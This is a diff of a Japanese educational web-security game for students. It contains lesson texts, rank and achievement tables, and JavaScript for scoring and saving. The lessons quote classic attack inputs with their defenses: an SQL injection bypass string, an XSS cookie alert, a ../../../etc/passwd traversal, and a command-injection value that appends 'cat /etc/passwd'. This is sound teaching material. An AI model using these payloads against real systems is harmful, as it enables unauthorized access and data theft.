+      what: "サーバーは「いつ・誰が・何をしたか」をログ（記録）に残しています。ログを読めば攻撃の痕跡を見つけられます。攻撃などのセキュリティ事故を「インシデント」と呼び、それに対応することをインシデント対応と言います。",
+      exampleLabel: "HTTPステータスコード（ログ末尾の数字）の意味：",
+      example: "200 … 成功\n401 … 認証失敗（ログイン失敗など）\n403 … アクセス禁止\n404 … ページが見つからない\n500 … サーバー内部エラー\n\n怪しいパターン：\n・同じIPから短時間に失敗が大量 → パスワード総当たり\n・失敗の連続のあとに成功 → 侵入された可能性大！\n・' OR や <script> など変な記号 → インジェクションの試み\n・../ が入ったアクセス → ディレクトリトラバーサル\n・ログの削除 → 証拠隠滅",
+      danger: "発見や報告が遅れるほど被害が広がる。ログを消したり書き換えたりすると、何が起きたか分からなくなる。",
+      defense: [
+        "① 検知：ログや監視で異常に気づく",
+        "② 報告：すぐに責任者に知らせる（一人で抱え込まない）",
+        "③ 封じ込め：被害が広がらないよう、該当機能を止める・ネットワークから切り離す",
+        "④ 復旧・再発防止：原因を直し、同じことが起きないようにする",
+        "ログは別の場所にも保存しておく。攻撃元にやり返すのは違法になりうるのでNG",
+      ],
+      tip: "これまでのミッションで学んだ攻撃が、ログの中では実際にこう見えます。総復習のつもりで見直してみましょう。",
+    },
+    examPoint: "CSIRT、デジタルフォレンジックス、インシデント対応の順序（まず報告・被害拡大防止）がよく問われます。",
+    terms: [
+      { t: "インシデント", d: "情報漏えいや不正アクセスなど、情報セキュリティを脅かす出来事。" },
+      { t: "CSIRT", d: "シーサート。組織内でセキュリティインシデントに対応する専門チーム。" },
+      { t: "デジタルフォレンジックス", d: "不正アクセスなどが起きたとき、ログなどの電子的な証拠を集めて分析し、原因や被害を明らかにすること。" },
+      { t: "SIEM", d: "さまざまな機器のログを集めて分析し、攻撃の兆候を見つけて知らせる仕組み。" },
+    ],
   },
 ];
 
-/* ===================== 学習テキスト =====================
-   STAGES と同じ順番。各ミッションの題材の解説。
-*/
-const LESSONS = [
-  {
-    term: "SQLインジェクション",
-    what: "Webサイトの裏側では、データベース（情報をしまっておく倉庫）に「SQL」という命令文で「この人の情報をちょうだい」と問い合わせています。入力欄にSQLの一部を書き込んで、この命令文の意味を書き換えてしまう攻撃がSQLインジェクションです（インジェクション＝注入）。",
-    exampleLabel: "ユーザー名に「' OR '1'='1' --」と入力すると、命令文はこうなる：",
-    example: "SELECT * FROM users WHERE name='' OR '1'='1' --' AND pass=''\n\n→ '1'='1' は常に正しい（真）\n→ -- から後ろはコメント扱いで無視される\n→ パスワードのチェックが消えてログインできてしまう！",
-    danger: "パスワードなしでの不正ログイン、個人情報の大量流出、データの書き換えや削除など。",
-    defense: [
-      "プレースホルダ（プリペアドステートメント）を使い、入力を「ただのデータ」として扱う",
-      "入力値の形式をチェックする（数字だけの欄に記号が来たら拒否など）",
-      "データベースのアカウントには必要最低限の権限だけを与える",
-      "エラーの詳しい内容を利用者に見せない",
-    ],
-    tip: "実際に何百万件もの個人情報が漏れた事件の原因になってきた、最も有名な脆弱性の一つです。",
-  },
-  {
-    term: "クロスサイトスクリプティング（XSS）",
-    what: "掲示板やコメント欄などに書き込んだ「スクリプト（プログラム）」が、そのページを見た別の人のブラウザで実行されてしまう脆弱性です。入力された文字を、文字としてではなくHTMLとして表示してしまうことが原因です。",
-    exampleLabel: "コメント欄にこんな文字を書き込まれると…",
-    example: '<img src=x onerror="alert(document.cookie)">\n\n→ 画像の読み込みに失敗した瞬間に onerror の中身が実行される\n→ alert の代わりに「Cookieを攻撃者に送る」処理を書かれたら？',
-    danger: "ログイン情報（Cookie）を盗まれてなりすましされる、偽のログイン画面を表示される、勝手に投稿される など。",
-    defense: [
-      "表示するときにエスケープする（< を &lt; に、> を &gt; に変換するなど）",
-      "JavaScriptでは innerHTML ではなく textContent を使う",
-      "CSP（コンテンツセキュリティポリシー）で、実行してよいスクリプトを制限する",
-      "Cookieに HttpOnly 属性を付け、スクリプトから読めないようにする",
-    ],
-    tip: "「入力はすべて疑う」「出力するときは必ず無害化」がWebセキュリティの合言葉です。",
-  },
-  {
-    term: "フィッシング",
-    what: "本物そっくりのメールやSMS、Webサイトを使って、パスワードやクレジットカード番号などをだまし取る詐欺です。魚釣り（fishing）のようにエサで釣ることが語源と言われています。システムの穴ではなく「人の心のすき」を突く攻撃（ソーシャルエンジニアリング）の代表です。",
-    exampleLabel: "URLの「本当の持ち主」の見分け方：",
-    example: "http://schoo1-portal.com.login-check.xyz/reset\n\n分解すると：\n・schoo1-portal.com. … 本物っぽく見せる飾り\n・login-check.xyz … 本当の持ち主（学校とは無関係）\n\n→ ドメインは「http:// の後、最初の / の直前」の右端を見る",
-    danger: "アカウントの乗っ取り、お金の被害、乗っ取られたアカウントから友達にさらに詐欺メールが送られる など。",
-    defense: [
-      "見分けポイント：差出人のアドレス、急がせる・脅す文面、URLの本当のドメイン",
-      "メールやSMSのリンクは押さず、ブックマークや公式アプリからアクセスする",
-      "多要素認証（パスワード＋スマホの確認コードなど）を設定しておく",
-      "怪しいと思ったら一人で判断せず、先生や家族に相談する",
-    ],
-    tip: "SMSを使ったものは「スミッシング」と呼ばれます。宅配便の不在通知を装ったものが多いので要注意。",
-  },
-  {
-    term: "パスワードの安全な保存",
-    what: "サービス側はパスワードをそのまま保存してはいけません。「ハッシュ関数」という、元に戻せない一方向の変換をして保存します。さらに、ユーザーごとにランダムな文字（ソルト＝塩）を混ぜてからハッシュ化することで、同じパスワードでも違う値になるようにします。",
-    exampleLabel: "MD5・ソルトなしだと…",
-    example: "「1234」の MD5 → 81dc9bdb52d04dc20036dbd8313ed055\n\n→ 誰が計算しても毎回同じ値\n→ ネットで検索するだけで元の「1234」が分かってしまう",
-    danger: "データベースが漏れたとき、パスワードがすぐにバレる。同じパスワードを使い回していると、他のサービスまで次々と乗っ取られる（パスワードリスト攻撃）。",
-    defense: [
-      "【作る側】bcrypt や Argon2 など、ソルト付きで計算がわざと遅いハッシュ関数を使う",
-      "【作る側】短すぎるパスワードを登録させない。ログにパスワードを書かない",
-      "【使う側】長いパスワード（単語をつなげたパスフレーズなど）にする",
-      "【使う側】使い回さない。パスワード管理アプリや多要素認証を使う",
-    ],
-    tip: "「暗号化」は鍵があれば元に戻せますが、「ハッシュ化」は元に戻せません。パスワードの保存にはハッシュ化を使います。",
-  },
-  {
-    term: "ディレクトリトラバーサル",
-    what: "ファイル名に「../」（1つ上のフォルダ）を混ぜて、公開しているフォルダの外にある、見せてはいけないファイルを読み出す攻撃です（トラバーサル＝横断・通り抜け）。パス・トラバーサルとも呼ばれます。",
-    exampleLabel: "/download?file=../../../etc/passwd を送ると…",
-    example: "/var/www/uploads/../../../etc/passwd\n\n uploads → www → var → / （ルート）までさかのぼって\n→ 実際に読まれるのは /etc/passwd（サーバーのユーザー一覧）",
-    danger: "設定ファイル、パスワード、他の人がアップロードしたファイルなど、サーバー内の重要な情報が読まれる。",
-    defense: [
-      "利用者から受け取ったファイル名をそのままパスに使わない",
-      "「番号 → ファイル名」の対応表を用意し、番号で指定させる",
-      "パスを整理（正規化）したあと、許可したフォルダの中かどうか確認する",
-      "Webサーバーには必要なファイルだけ読める権限を与える",
-    ],
-    tip: "フォルダの階層構造（ツリー）と「相対パス」「絶対パス」の考え方を知っていると理解しやすい攻撃です。",
-  },
-  {
-    term: "セキュリティ設定のミス",
-    what: "プログラム自体に問題がなくても、設定を間違えるだけで大きな穴が開きます。Webの脆弱性ランキング「OWASP Top 10」でも上位に入る、とても多い原因です。",
-    exampleLabel: "よくある設定ミスの例：",
-    example: "・admin / admin などの初期パスワードのまま\n・開発用のデバッグモードが本番でもオン\n・使っていないサービスやポートが開きっぱなし\n・管理画面に世界中からアクセスできる（0.0.0.0/0）\n・最強権限の root で直接ログインできる",
-    danger: "初期パスワードはネットで調べればすぐ分かるので、自動プログラムで大量に狙われる。デバッグ画面からは内部の情報が丸見えになる。",
-    defense: [
-      "公開前にチェックリストで設定を確認する",
-      "初期パスワードは必ず変更する",
-      "必要な人に、必要な権限だけを与える（最小権限の原則）",
-      "定期的に設定を見直し、ソフトウェアをアップデートする",
-    ],
-    tip: "2016年には、初期パスワードのままの防犯カメラやルーターが「Mirai」というウイルスに大量に乗っ取られ、大規模な攻撃に使われました。",
-  },
-  {
-    term: "認証と認可（IDOR）",
-    what: "「認証」は『あなたは誰？』を確かめること（ログイン）。「認可」は『あなたは何をしていい？』を決めること。ログインのチェックだけして、そのデータを見る権限があるかを確認し忘れると、他人のデータにアクセスできてしまいます。この脆弱性を IDOR（安全でない直接オブジェクト参照）と呼びます。",
-    exampleLabel: "URLの番号を書き換えるだけで…",
-    example: "自分の成績：/api/grades/1001\n↓ 番号を1つ変える\n他人の成績：/api/grades/1002  ← 見えてしまう！",
-    danger: "他人の成績・住所・メッセージなどの個人情報が見られる。番号を順番に変えれば全員分を集められてしまう。",
-    defense: [
-      "サーバー側で毎回「この人がこのデータを見ていいか」をチェックする",
-      "画面にボタンを出さないだけ（見た目で隠すだけ）では対策にならない",
-      "推測しにくいIDにするのは補助的な対策。それだけでは不十分",
-    ],
-    tip: "SQLインジェクション対策（プレースホルダ）が完璧でも防げない、というのがポイント。脆弱性ごとに対策は別物です。",
-  },
-  {
-    term: "OSコマンドインジェクション",
-    what: "プログラムの中からサーバーのOSのコマンド（ping、ls など）を呼び出すとき、入力に別のコマンドを混ぜて、攻撃者の好きなコマンドを実行させる攻撃です。",
-    exampleLabel: "ホスト名の欄にこう入力すると…",
-    example: "8.8.8.8; cat /etc/passwd\n\n→ 実行されるのは「ping -c 1 8.8.8.8; cat /etc/passwd」\n→ ; の後ろも別のコマンドとして実行される\n※ ; && | ` $( ) などがコマンドをつなぐ特殊な記号",
-    danger: "サーバー上でどんなコマンドでも実行できる＝サーバーの乗っ取り。ファイルの削除、ウイルスの設置、他への攻撃の踏み台など、被害はとても大きい。",
-    defense: [
-      "そもそもOSコマンドを使わず、プログラミング言語のライブラリで代わりにする",
-      "使う場合はシェルを通さず、引数をリストで渡す",
-      "入力が正しい形式（IPアドレスなど）か、許可リストで検証する",
-      "プログラムを最小限の権限で動かす",
-    ],
-    tip: "SQLインジェクション・XSS・コマンドインジェクションは、どれも「データのつもりの入力が、命令として解釈される」という同じ仕組みの仲間です。",
-  },
-  {
-    term: "秘密情報のハードコード",
-    what: "APIキーやパスワードなどの秘密情報を、ソースコードに直接書き込むこと（ハードコード）は危険です。ブラウザで動くJavaScriptやスマホアプリは利用者の手元に配られるので、中身を誰でも見ることができます。",
-    exampleLabel: "ブラウザで誰でもできること：",
-    example: "F12キー（開発者ツール）→「Sources」タブ\n→ 配信された config.js の中身がそのまま読める\n→ const API_KEY = \"sk_live_...\" も丸見え",
-    danger: "キーを使ってなりすまされる、有料APIを勝手に使われ高額請求が来る、データベースに侵入される など。GitHubに公開すると、自動で探すプログラムに数分で見つけられることもある。",
-    defense: [
-      "秘密情報はサーバー側の環境変数やシークレット管理サービスに置く",
-      "ブラウザ・アプリ → 自分のサーバー → 外部API の順で中継する",
-      ".gitignore で設定ファイルをGitに含めない",
-      "漏れたら、まずキーやパスワードを無効化・変更する（行を消すだけでは履歴に残る）",
-    ],
-    tip: "Gitは過去の履歴をすべて覚えています。一度コミットした秘密情報は「漏れたもの」として扱いましょう。",
-  },
-  {
-    term: "ログ解析とインシデント対応",
-    what: "サーバーは「いつ・誰が・何をしたか」をログ（記録）に残しています。ログを読めば攻撃の痕跡を見つけられます。攻撃などのセキュリティ事故を「インシデント」と呼び、それに対応することをインシデント対応と言います。",
-    exampleLabel: "HTTPステータスコード（ログ末尾の数字）の意味：",
-    example: "200 … 成功\n401 … 認証失敗（ログイン失敗など）\n403 … アクセス禁止\n404 … ページが見つからない\n500 … サーバー内部エラー\n\n怪しいパターン：\n・同じIPから短時間に401が大量 → パスワード総当たり\n・' OR や <script> など変な記号 → インジェクションの試み\n・../ が入ったアクセス → ディレクトリトラバーサル\n・攻撃っぽいアクセスなのに 200 → 成功した可能性大！",
-    danger: "発見や報告が遅れるほど被害が広がる。ログを消したり書き換えたりすると、何が起きたか分からなくなる。",
-    defense: [
-      "① 検知：ログや監視で異常に気づく",
-      "② 報告：すぐに責任者に知らせる（一人で抱え込まない）",
-      "③ 封じ込め：被害が広がらないよう、該当機能を止めるなどする",
-      "④ 復旧・再発防止：原因を直し、同じことが起きないようにする",
-      "ログは証拠なので保存しておく。攻撃元にやり返すのは違法になりうるのでNG",
-    ],
-    tip: "これまでのミッション1〜9で学んだ攻撃が、ログの中では実際にこう見えます。総復習のつもりで見直してみましょう。",
-  },
+const RANKS = [
+  { min: 0.9, rank: "S", title: "伝説のホワイトハッカー", msg: "完璧に近い診断！あなたがいればこの学校は安心です。" },
+  { min: 0.75, rank: "A", title: "凄腕セキュリティエンジニア", msg: "ほとんどの穴を見抜きました。プロ級です！" },
+  { min: 0.55, rank: "B", title: "一人前のホワイトハッカー", msg: "いい調子！見逃した穴の解説を読み直すとさらに伸びます。" },
+  { min: 0.3, rank: "C", title: "見習いハッカー", msg: "基本はつかめています。苦手リストを見て再挑戦してみよう！" },
+  { min: -Infinity, rank: "D", title: "セキュリティ研修生", msg: "最初はみんなここから。学習テキストを読んで再挑戦！" },
 ];
 
+const DIFFS = {
+  easy:   { label: "初級", desc: "ヒント無料・誤検知 -10点・時間制限なし", showCount: true,  hint: true,  hintCost: 0,  fp: 10, timer: false },
+  normal: { label: "中級", desc: "ヒント -50点・誤検知 -30点・時間制限なし", showCount: true,  hint: true,  hintCost: 50, fp: 30, timer: false },
+  hard:   { label: "上級", desc: "脆弱性の数は非表示・ヒントなし・誤検知 -50点・制限時間あり（残り時間ボーナス）", showCount: false, hint: false, hintCost: 0, fp: 50, timer: true },
+};
+
+const ACHIEVEMENTS = [
+  { id: "first",      icon: "🔰", name: "はじめての診断",         desc: "ミッションを1つクリアする" },
+  { id: "perfect",    icon: "💎", name: "パーフェクト診断",       desc: "全発見・誤検知なし・クイズ正解でミッションをクリア" },
+  { id: "phish_eye",  icon: "🎣", name: "フィッシング見破り",     desc: "フィッシングのミッションをパーフェクト" },
+  { id: "sqli_hunter",icon: "💉", name: "SQLハンター",            desc: "SQLインジェクションのミッションをパーフェクト" },
+  { id: "xss_hunter", icon: "🧪", name: "XSSハンター",            desc: "XSSのミッションをパーフェクト" },
+  { id: "net_guard",  icon: "📡", name: "ネットワークガーディアン", desc: "ネットワークとWi-Fiのミッションをパーフェクト" },
+  { id: "detective",  icon: "🕵️", name: "名探偵",                 desc: "ログ解析のミッションをパーフェクト" },
+  { id: "story",      icon: "🏫", name: "まなび高校の守護者",     desc: "ストーリーモードをクリア" },
+  { id: "story_hard", icon: "👑", name: "エリートホワイトハッカー", desc: "上級でストーリーモードをクリア" },
+  { id: "rank_s",     icon: "🌟", name: "伝説の称号",             desc: "ストーリーかクイックプレイでSランクを獲得" },
+  { id: "no_fp",      icon: "🎯", name: "誤検知ゼロ",             desc: "5ミッション以上のプレイを誤検知ゼロでクリア" },
+  { id: "no_hint",    icon: "🧠", name: "自力で解決",             desc: "ヒントを使わずにストーリーモードをクリア" },
+  { id: "speed",      icon: "⚡", name: "スピード診断",           desc: "上級で制限時間の半分以上を残してミッションを全発見" },
+  { id: "weak",       icon: "💪", name: "苦手克服",               desc: "苦手克服モードをクリア" },
+  { id: "quiz10",     icon: "📝", name: "クイズマスター",         desc: "直し方クイズに10問連続で正解" },
+  { id: "all_topics", icon: "🗺️", name: "全分野制覇",             desc: "全15題材をプレイする" },
+  { id: "scholar",    icon: "📖", name: "勉強家",                 desc: "学習テキストの全章を読む" },
+  { id: "glossary",   icon: "🎓", name: "用語博士",               desc: "用語クイズで10問中9問以上正解" },
+];
+</script>
+<script>
+/* =========================================================
+   ゲーム処理
+   ========================================================= */
+const $ = (id) => document.getElementById(id);
+const el = (tag, text, cls) => {
+  const e = document.createElement(tag);
+  if (text !== undefined && text !== null) e.textContent = text;
+  if (cls) e.className = cls;
+  return e;
+};
+const shuffle = (arr) => {
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+};
+const pct = (x) => Math.round(x * 100) + "%";
+
+/* ---------------- セーブデータ（このブラウザだけに保存） ---------------- */
+const SAVE_KEY = "whm-save-v2";
+function defaultSave() {
+  return { diff: "normal", sound: true, topics: {}, achievements: {}, lastVariant: {}, quizStreak: 0, lessonsRead: [], best: {} };
+}
+let save = defaultSave();
+try {
+  const raw = localStorage.getItem(SAVE_KEY);
+  if (raw) save = Object.assign(defaultSave(), JSON.parse(raw));
+} catch (e) { /* 保存できない環境でも遊べるようにする */ }
+function persist() {
+  try { localStorage.setItem(SAVE_KEY, JSON.stringify(save)); } catch (e) { }
+}
+function topicStat(id) {
+  if (!save.topics[id]) save.topics[id] = { plays: 0, found: 0, total: 0, fp: 0, quizOk: 0, quizN: 0, missed: {} };
+  return save.topics[id];
+}
+function topicRate(s) {
+  if (!s || s.plays === 0) return null;
+  const detect = s.total ? s.found / s.total : 0;
+  const quiz = s.quizN ? s.quizOk / s.quizN : 0;
+  return detect * 0.7 + quiz * 0.3;
+}
+
+/* ---------------- 効果音（Web Audio） ---------------- */
+let audioCtx = null;
+function tone(seq, type = "square", vol = 0.06) {
+  if (!save.sound) return;
+  try {
+    audioCtx = audioCtx || new (window.AudioContext || window.webkitAudioContext)();
+    let t = audioCtx.currentTime;
+    seq.forEach(([freq, dur]) => {
+      const o = audioCtx.createOscillator();
+      const g = audioCtx.createGain();
+      o.type = type;
+      o.frequency.value = freq;
+      g.gain.setValueAtTime(vol, t);
+      g.gain.exponentialRampToValueAtTime(0.0001, t + dur);
+      o.connect(g).connect(audioCtx.destination);
+      o.start(t);
+      o.stop(t + dur);
+      t += dur * 0.9;
+    });
+  } catch (e) { }
+}
+const SFX = {
+  click: () => tone([[880, 0.05]], "square", 0.03),
+  unclick: () => tone([[440, 0.05]], "square", 0.03),
+  good: () => tone([[660, 0.08], [880, 0.08], [1320, 0.15]], "square", 0.05),
+  bad: () => tone([[200, 0.12], [150, 0.2]], "sawtooth", 0.05),
+  fanfare: () => tone([[523, 0.12], [659, 0.12], [784, 0.12], [1047, 0.35]], "square", 0.06),
+  ach: () => tone([[988, 0.08], [1319, 0.25]], "triangle", 0.08),
+  tick: () => tone([[1200, 0.03]], "square", 0.02),
+};
+
+/* ---------------- トースト ---------------- */
+function toast(msg, kind) {
+  const t = el("div", msg, "toast" + (kind ? " " + kind : ""));
+  $("toasts").appendChild(t);
+  setTimeout(() => t.remove(), kind === "ach" ? 3000 : 1400);
+}
+
+/* ---------------- 実績 ---------------- */
+let newAchThisRun = [];
+function unlock(id) {
+  if (save.achievements[id]) return;
+  const a = ACHIEVEMENTS.find(x => x.id === id);
+  if (!a) return;
+  save.achievements[id] = new Date().toISOString().slice(0, 10);
+  persist();
+  newAchThisRun.push(a);
+  SFX.ach();
+  toast(`🏆 実績解除：${a.icon} ${a.name}`, "ach");
+  updateAchCount();
+}
+function updateAchCount() {
+  $("ach-count").textContent = `${Object.keys(save.achievements).length} / ${ACHIEVEMENTS.length} 解除`;
+}
+
+/* ---------------- 画面切り替え ---------------- */
+let stopTimer = () => {};
+function show(id) {
+  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+  $(id).classList.add("active");
+  window.scrollTo(0, 0);
+}
+function goTitle() {
+  stopTimer();
+  renderTitle();
+  show("s-title");
+}
+
+/* ---------------- タイトル ---------------- */
+function renderTitle() {
+  const chips = $("diff-chips");
+  chips.innerHTML = "";
+  Object.entries(DIFFS).forEach(([key, d]) => {
+    const b = el("button", d.label, save.diff === key ? "on" : "");
+    b.addEventListener("click", () => { save.diff = key; persist(); SFX.click(); renderTitle(); });
+    chips.appendChild(b);
+  });
+  $("diff-desc").textContent = DIFFS[save.diff].desc;
+  const parts = [];
+  ["story", "quick"].forEach(m => {
+    const b = save.best[`${m}_${save.diff}`];
+    if (b) parts.push(`${m === "story" ? "ストーリー" : "クイック"}（${DIFFS[save.diff].label}）ベスト：${b.score}点 ${b.rank}ランク`);
+  });
+  $("best-score").textContent = parts.join(" ／ ");
+  $("btn-sound").textContent = save.sound ? "🔊 音あり" : "🔈 音なし";
+  updateAchCount();
+}
+
+/* ---------------- プレイの状態 ---------------- */
+const run = { mode: "story", queue: [], pos: 0, score: 0, max: 0, results: [], diff: "normal" };
+const M = { topic: null, variant: null, vIdx: 0, marks: new Set(), hintUsed: false, timeLeft: 0, timeLimit: 0, quiz: null, gain: 0, hits: 0, fps: 0, bonus: 0, submitted: false };
+
+function startRun(mode, queue) {
+  run.mode = mode;
+  run.queue = queue;
+  run.pos = 0;
+  run.score = 0;
+  run.max = 0;
+  run.results = [];
+  run.diff = save.diff;
+  newAchThisRun = [];
+  startMission();
+}
+
+function startStory() {
+  const box = $("prologue-text");
+  box.innerHTML = "";
+  PROLOGUE.forEach((line, i) => {
+    const p = el("p", line);
+    p.style.animationDelay = (i * 0.5) + "s";
+    box.appendChild(p);
+  });
+  show("s-prologue");
+}
+
+function startQuick() {
+  startRun("quick", shuffle(TOPICS.map((_, i) => i)).slice(0, 5));
+}
+
+function weakQueue() {
+  const played = [], unplayed = [];
+  TOPICS.forEach((t, i) => {
+    const r = topicRate(save.topics[t.id]);
+    if (r === null) unplayed.push(i); else played.push({ i, r: r + Math.random() * 0.01 });
+  });
+  played.sort((a, b) => a.r - b.r);
+  const weak = played.filter(p => p.r < 0.8).map(p => p.i);
+  const rest = played.filter(p => p.r >= 0.8).map(p => p.i);
+  return weak.concat(shuffle(unplayed), rest).slice(0, 5);
+}
+function startWeak() {
+  if (Object.keys(save.topics).length === 0) {
+    alert("まだプレイ記録がありません。まずはストーリーモードかクイックプレイで遊んでみよう！");
+    return;
+  }
+  startRun("weak", weakQueue());
+}
+
+function pickVariant(topic) {
+  const n = topic.variants.length;
+  const last = save.lastVariant[topic.id];
+  let idx = Math.floor(Math.random() * n);
+  if (n > 1 && idx === last) idx = (idx + 1 + Math.floor(Math.random() * (n - 1))) % n;
+  save.lastVariant[topic.id] = idx;
+  persist();
+  return idx;
+}
+
+/* ---------------- ミッション ---------------- */
+function renderCode(container, variant, decorate) {
+  container.innerHTML = "";
+  variant.lines.forEach((text, i) => {
+    const btn = el("button", null, "ln");
+    btn.append(el("span", String(i + 1), "no"), el("span", text || " "));
+    decorate(btn, i);
+    container.appendChild(btn);
+  });
+}
+
+function startMission() {
+  const d = DIFFS[run.diff];
+  const topicIdx = run.queue[run.pos];
+  M.topic = TOPICS[topicIdx];
+  M.vIdx = pickVariant(M.topic);
+  M.variant = M.topic.variants[M.vIdx];
+  M.marks = new Set();
+  M.hintUsed = false;
+  M.submitted = false;
+  run.max += M.variant.vulns.length * 100 + 50 + (d.timer ? 50 : 0);  // 上級は時間ボーナス分も満点に含める
+
+  const v = M.variant;
+  $("hud-stage").textContent = `${run.pos + 1}/${run.queue.length}`;
+  $("hud-score").textContent = run.score;
+  $("hud-marks").textContent = 0;
+  $("hud-total").textContent = d.showCount ? v.vulns.length : "？";
+  $("hud-diff").textContent = d.label;
+  $("hud-type").textContent = `${CATS[M.topic.cat]} / ${v.type}`;
+  $("g-story").style.display = run.mode === "story" ? "block" : "none";
+  $("g-story").textContent = "STORY：" + M.topic.story;
+  $("g-title").textContent = `MISSION ${run.mode === "story" ? topicIdx + 1 : run.pos + 1}：${v.title}`;
+  $("g-client").textContent = v.client;
+  $("g-scenario").textContent = v.scenario;
+  $("g-hint").style.display = "none";
+  $("g-hint").textContent = "ヒント：" + v.hint;
+
+  const hb = $("btn-hint");
+  hb.style.display = d.hint ? "" : "none";
+  hb.disabled = false;
+  hb.textContent = d.hintCost ? `ヒント (-${d.hintCost})` : "ヒント（無料）";
+
+  renderCode($("g-code"), v, (btn, idx) => {
+    btn.addEventListener("click", () => {
+      if (M.submitted) return;
+      if (M.marks.has(idx)) { M.marks.delete(idx); btn.classList.remove("marked"); SFX.unclick(); }
+      else { M.marks.add(idx); btn.classList.add("marked"); SFX.click(); }
+      $("hud-marks").textContent = M.marks.size;
+    });
+  });
+
+  stopTimer();
+  $("hud-timer-wrap").style.display = d.timer ? "" : "none";
+  if (d.timer) {
+    M.timeLimit = 40 + v.lines.length * 6;
+    M.timeLeft = M.timeLimit;
+    const tw = $("hud-timer-wrap");
+    tw.classList.remove("low");
+    $("hud-timer").textContent = M.timeLeft;
+    const id = setInterval(() => {
+      M.timeLeft--;
+      $("hud-timer").textContent = M.timeLeft;
+      if (M.timeLeft <= 10) { tw.classList.add("low"); SFX.tick(); }
+      if (M.timeLeft <= 0) { stopTimer(); toast("時間切れ！"); submit(true); }
+    }, 1000);
+    stopTimer = () => { clearInterval(id); stopTimer = () => {}; };
+  }
+  show("s-game");
+}
+
+function useHint() {
+  if (M.hintUsed) return;
+  M.hintUsed = true;
+  $("g-hint").style.display = "block";
+  $("btn-hint").disabled = true;
+  const cost = DIFFS[run.diff].hintCost;
+  if (cost) toast(`ヒント使用 -${cost}`);
+}
+
+function submit(timeUp) {
+  if (M.submitted) return;
+  const d = DIFFS[run.diff];
+  const v = M.variant;
+  if (!timeUp && M.marks.size === 0 && !confirm("1行もマークしていません。このまま提出しますか？")) return;
+  M.submitted = true;
+  stopTimer();
+
+  const vulnLines = new Set(v.vulns.map(x => x.line));
+  const neutral = new Set(v.neutral || []);
+  let hits = 0, fps = 0;
+  M.marks.forEach(m => {
+    if (vulnLines.has(m)) hits++;
+    else if (!neutral.has(m)) fps++;
+  });
+  let gain = hits * 100 - fps * d.fp - (M.hintUsed ? d.hintCost : 0);
+  let bonus = 0;
+  if (d.timer && hits === v.vulns.length && fps === 0 && M.timeLeft > 0) bonus = Math.round(50 * M.timeLeft / M.timeLimit);  // 最大+50
+  gain += bonus;
+  M.gain = gain; M.hits = hits; M.fps = fps; M.bonus = bonus;
+  run.score += gain;
+
+  // 記録
+  const st = topicStat(M.topic.id);
+  st.plays++; st.found += hits; st.total += v.vulns.length; st.fp += fps;
+  v.vulns.forEach(x => { if (!M.marks.has(x.line)) { const k = x.name.replace(/[①②③④⑤]$/, ""); st.missed[k] = (st.missed[k] || 0) + 1; } });
+  persist();
+
+  if (hits === v.vulns.length && fps === 0) SFX.good(); else SFX.bad();
+  if (d.timer && hits === v.vulns.length && M.timeLeft >= M.timeLimit / 2) unlock("speed");
+
+  // 表示
+  $("r-title").textContent = `診断結果：${hits} / ${v.vulns.length} 件発見`;
+  updateGain();
+  $("r-bonus").textContent = bonus ? `⚡ 残り時間ボーナス +${bonus}` : (timeUp ? "時間切れ" : "");
+  renderCode($("r-code"), v, (btn, idx) => {
+    btn.classList.add("done");
+    if (vulnLines.has(idx)) btn.classList.add(M.marks.has(idx) ? "hit" : "miss");
+    else if (M.marks.has(idx) && !neutral.has(idx)) btn.classList.add("fp");
+    else if (M.marks.has(idx)) btn.classList.add("marked");
+  });
+  const list = $("r-list");
+  list.innerHTML = "";
+  v.vulns.forEach(x => {
+    const found = M.marks.has(x.line);
+    const div = el("div", null, "result-item " + (found ? "ok" : "ng"));
+    div.append(
+      el("h4", `${found ? "✔ 発見" : "✘ 見逃し"}　${x.line + 1}行目：${x.name}`),
+      el("div", x.why),
+      el("div", "【対策】\n" + x.fix, "fix")
+    );
+    list.appendChild(div);
+  });
+  if (fps > 0) {
+    list.appendChild(el("div", `安全な行を ${fps} 行マークしました（-${fps * d.fp}）。本物の診断でも「誤検知」は相手の時間を奪うので、根拠を持って報告しよう。`, "result-item"));
+  }
+  if (neutral.size) {
+    list.appendChild(el("div", `※ ${[...neutral].map(n => n + 1).join("・")}行目は「怪しいとも言える」行なので、マークしても減点なしです。`, "sub"));
+  }
+
+  // クイズ（ランダムに1問、選択肢もシャッフル）
+  const q = M.topic.quizzes[Math.floor(Math.random() * M.topic.quizzes.length)];
+  const order = shuffle(q.choices.map((_, i) => i));
+  M.quiz = { q, order, answer: order.indexOf(q.answer) };
+  $("q-text").textContent = q.q;
+  $("q-explain").style.display = "none";
+  $("btn-next").disabled = true;
+  $("btn-next").textContent = run.pos < run.queue.length - 1 ? "次のミッションへ" : "結果を見る";
+  const qc = $("q-choices");
+  qc.innerHTML = "";
+  order.forEach((orig, i) => {
+    const b = el("button", `${"ABCD"[i]}. ${q.choices[orig]}`);
+    b.addEventListener("click", () => answerQuiz(i));
+    qc.appendChild(b);
+  });
+  show("s-result");
+}
+
+function updateGain() {
+  const g = $("r-gain");
+  g.textContent = (M.gain >= 0 ? "+" : "") + M.gain;
+  g.classList.toggle("neg", M.gain < 0);
+}
+
+function answerQuiz(i) {
+  const btns = $("q-choices").querySelectorAll("button");
+  btns.forEach((b, j) => {
+    b.disabled = true;
+    if (j === M.quiz.answer) b.classList.add("correct");
+    else if (j === i) b.classList.add("wrong");
+  });
+  const ok = i === M.quiz.answer;
+  const st = topicStat(M.topic.id);
+  st.quizN++;
+  if (ok) {
+    st.quizOk++;
+    M.gain += 50; run.score += 50;
+    save.quizStreak++;
+    SFX.good(); toast("正解！ +50");
+    if (save.quizStreak >= 10) unlock("quiz10");
+  } else {
+    save.quizStreak = 0;
+    SFX.bad(); toast("ざんねん…");
+  }
+  persist();
+  updateGain();
+  const ex = $("q-explain");
+  ex.textContent = (ok ? "正解！ " : "不正解。 ") + M.quiz.q.explain;
+  ex.style.display = "block";
+
+  const perfect = M.hits === M.variant.vulns.length && M.fps === 0 && ok;
+  run.results.push({ topic: M.topic, title: M.variant.title, gain: M.gain, hits: M.hits, total: M.variant.vulns.length, fps: M.fps, quizOk: ok, hint: M.hintUsed, perfect });
+
+  // 実績（ミッション単位）
+  unlock("first");
+  if (perfect) {
+    unlock("perfect");
